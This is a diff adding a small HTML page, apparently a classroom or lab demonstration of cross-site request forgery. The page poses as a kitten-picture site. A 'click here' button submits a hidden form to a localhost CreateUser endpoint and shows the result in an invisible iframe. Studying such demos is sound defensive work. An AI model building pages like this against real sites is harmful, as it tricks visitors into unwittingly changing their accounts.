@@ -1,0 +1,27 @@
+﻿<!DOCTYPE html>
+<html>
+<head runat="server">
+    <title>title</title>
+    <link href="Site.css" rel="stylesheet" type="text/css" />
+    <script src="/Scripts/jquery-1.12.4.js" type="text/javascript"></script>
+</head>
+<body>
+    <div class="page">
+        <header>
+            <div id="status-area"></div>
+            <div id="title">
+                <h1 style="color:black">Just Another Unsuspicous Site Displaying Funny Kitten Images</h1>
+            </div>
+        </header>
+        <section id="main">
+
+            <form action="http://localhost:59586/CrossSiteRequestForgery/CreateUser" method="POST" target="dummyframe">
+                <input type="text" value="user from malicous site" name="userName" style="visibility:hidden;" />
+                <input type="submit" value="click here to see the kitten pictures">
+            </form>
+            <iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe" style="visibility:hidden"></iframe>
+            <footer></footer>
+        </section>
+    </div>
+</body>
+</html>
